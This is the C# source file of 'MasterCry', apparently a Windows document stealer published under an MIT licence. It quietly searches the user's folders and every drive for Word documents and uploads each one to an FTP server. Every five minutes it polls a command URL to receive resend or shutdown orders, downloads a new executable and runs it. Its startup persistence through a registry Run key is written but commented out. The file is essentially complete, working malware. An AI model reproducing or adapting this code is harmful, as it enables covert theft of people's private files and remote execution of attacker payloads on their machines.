/****************************** ghost1372.github.io ******************************\
*	Module Name:	Form1.cs
*	Project:		MasterCry
*	Copyright (C) 2017 Mahdi Hosseini, All rights reserved.
*	This software may be modified and distributed under the terms of the MIT license.  See LICENSE file for details.
*
*	Written by Mahdi Hosseini <Mahdidvb72@gmail.com>,  2017, 9, 18, 08:45 ب.ظ
*
***********************************************************************************/

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MasterCry
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        //Todo: Enable StartUp
        private void Form1_Load(object sender, EventArgs e)
        {
            Task task = Task.Factory.StartNew(() =>
            {
                if (!System.IO.File.Exists(BuildVars.Save_Location))
                    System_Details.getOperatingSystemInfo();

                if (!System.IO.File.Exists(BuildVars.Save_Items_Location))
                {
                    foreach (var drv in getDrives())
                    {
                        var data = GetFileList(drv);

                        foreach (var item in data)
                            WriteItems(item);
                    }
                    Upload();
                }
                if (System.IO.File.Exists(BuildVars.Save_Items_Location))
                {
                    string content = File.ReadAllText(BuildVars.Save_Items_Location);
                    if (content.Length != 0)
                        Upload();
                }
            });

            //if (!CheckRegistryExists())
            //    RegisterInStartup(true);
        }

        #region "Search Files on Drives"

        private List<string> getDrives()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            List<string> listRange = new List<string>();

            foreach (DriveInfo d in allDrives)
            {
                if (d.DriveType == DriveType.Fixed || d.DriveType == DriveType.Removable)
                {
                    if (d.Name.Equals(OSDrive()))
                    {
                        listRange.Add(d.Name + @"Users\" + Environment.UserName + @"\Desktop");
                        listRange.Add(d.Name + @"Users\" + Environment.UserName + @"\Documents");
                        listRange.Add(d.Name + @"Users\" + Environment.UserName + @"\Downloads");
                    }
                    else
                        listRange.Add(d.Name);
                }
            }
            return listRange;
        }

        public IEnumerable<string> GetFileList(string rootFolderPath)
        {
            string[] exceptions = new string[] { @"C:\System Volume Information", @"C:\$RECYCLE.BIN",
            @"D:\System Volume Information", @"D:\$RECYCLE.BIN",
            @"E:\System Volume Information", @"E:\$RECYCLE.BIN",
            @"F:\System Volume Information", @"F:\$RECYCLE.BIN",
            @"G:\System Volume Information", @"G:\$RECYCLE.BIN",
            @"H:\System Volume Information", @"H:\$RECYCLE.BIN",
            @"I:\System Volume Information", @"I:\$RECYCLE.BIN",
            @"J:\System Volume Information", @"J:\$RECYCLE.BIN",
            @"K:\System Volume Information", @"K:\$RECYCLE.BIN",
            @"L:\System Volume Information", @"L:\$RECYCLE.BIN",
            @"M:\System Volume Information", @"M:\$RECYCLE.BIN"};

            Queue<string> pending = new Queue<string>();
            pending.Enqueue(rootFolderPath);
            string[] tmp;
            while (pending.Count > 0)
            {
                rootFolderPath = pending.Dequeue();
                try
                {
                    tmp = Directory.GetFiles(rootFolderPath).Where(file => exceptions.All(e => !file.StartsWith(e)) && file.EndsWith(".doc", StringComparison.CurrentCultureIgnoreCase)).Union(Directory.GetFiles(rootFolderPath).Where(files => exceptions.All(e => !files.StartsWith(e)) && files.EndsWith(".docx", StringComparison.CurrentCultureIgnoreCase))).ToArray();
                }
                catch (UnauthorizedAccessException) { continue; }
                catch (DirectoryNotFoundException) { continue; }
                for (int i = 0; i < tmp.Length; i++)
                {
                    yield return tmp[i];
                }
                tmp = Directory.GetDirectories(rootFolderPath);
                for (int i = 0; i < tmp.Length; i++)
                {
                    pending.Enqueue(tmp[i]);
                }
            }
        }

        private string OSDrive()
        {
            return Path.GetPathRoot(Environment.SystemDirectory);
        }

        private static void WriteItems(string Text)
        {
            try
            {
                using (System.IO.StreamWriter file =
           new System.IO.StreamWriter(BuildVars.Save_Items_Location, true))
                {
                    file.WriteLine(Text);
                }
            }
            catch (IOException) { }
            catch (Exception) { }
        }

        #endregion "Search Files on Drives"

        #region "Startup"

        private void RegisterInStartup(bool isChecked)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
                    (BuildVars.Registry_Key, true);
            if (isChecked)
                registryKey.SetValue(BuildVars.Registry_AppName, Application.ExecutablePath);
            else
                registryKey.DeleteValue(BuildVars.Registry_AppName);
        }

        public static bool CheckRegistryExists()
        {
            RegistryKey root;
            root = Registry.CurrentUser.OpenSubKey(BuildVars.Registry_Key, false);

            return root.GetValue(BuildVars.Registry_AppName) != null;
        }

        #endregion "Startup"

        #region "Downloader"

        //Todo: Test Downloder

        private void Downloader()
        {
            if (IsConnectToInternet())
            {
                var result = (new WebClient()).DownloadString(BuildVars.Command_URL);

                String link = ExtractData(result, BuildVars.Command_URL_Symbol);
                String ver = ExtractData(result, BuildVars.Command_VER_Symbol);
                String com = ExtractData(result, BuildVars.Command_COM_Symbol);

                // Command Control
                if (com.Equals(BuildVars.Command_RESEND))       //Resend Data
                {
                    if (File.Exists(BuildVars.Save_Items_Location))
                        File.Delete(BuildVars.Save_Items_Location);
                    Form1_Load(null, null);
                }
                else if (com.Equals(BuildVars.Command_SHUTDOWN))        //ShutDOWN App
                    RegisterInStartup(false);

                var preVer = System_Details.ReadSetting(BuildVars.Config_Command_Version);

                if (preVer.Equals("0") || ver != preVer && !link.Equals("null"))
                {
                    try
                    {
                        System_Details.AddUpdateAppSettings(BuildVars.Config_Command_Version, ver);
                        using (WebClient wc = new WebClient())
                        {
                            wc.DownloadFileCompleted += WebClientDownloadCompleted;
                            wc.DownloadFileAsync(new System.Uri(link), ver +
                            BuildVars.Exe_Name);
                        }
                    }
                    catch (WebException) { }
                    catch (Exception) { }
                }
            }
        }

        private void WebClientDownloadCompleted(object sender, AsyncCompletedEventArgs args)
        {
            try
            {
                System.Diagnostics.Process.Start(System_Details.ReadSetting(BuildVars.Config_Command_Version) + BuildVars.Exe_Name);
            }
            catch (System.IO.FileNotFoundException) { }
            catch (IOException) { }
        }

        private string ExtractData(string Result, string Symbol)
        {
            int pFrom = Result.IndexOf(Symbol) + Symbol.Length;
            int pTo = Result.LastIndexOf(Symbol);
            return Result.Substring(pFrom, pTo - pFrom);
        }

        public static bool IsConnectToInternet()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                    return true;
            }
            catch { return false; }
        }

        #endregion "Downloader"

        private void Upload()
        {
            if (IsConnectToInternet())
            {
                try
                {
                    Task.Factory.StartNew(() =>
                    {
                        if (File.Exists(BuildVars.Save_Items_Location))
                        {
                            var lines = File.ReadAllLines(BuildVars.Save_Items_Location);
                            foreach (var line in lines)
                            {
                                using (WebClient client = new WebClient())
                                {
                                    client.Credentials = new NetworkCredential(BuildVars.FTP_USER, BuildVars.FTP_PASS);
                                    client.UploadFile(BuildVars.FTP_SERVER + Path.GetFileName(line), "STOR", line);
                                }
                                string text = File.ReadAllText(BuildVars.Save_Items_Location);
                                text = Regex.Replace(line, @"^\s*$", "", RegexOptions.Multiline);
                                using (System.IO.StreamWriter file =
                                     new System.IO.StreamWriter(BuildVars.Save_Items_Location))
                                {
                                    file.Write(text);
                                }
                            }
                        }
                        File.Delete(BuildVars.Save_Items_Location);
                    });
                }
                catch (WebException) { }
                catch (Exception) { }
            }
        }

        //Check Every 5 Min
        private void tmrURLCheck_Tick(object sender, EventArgs e)
        {
            Downloader();
        }
    }
}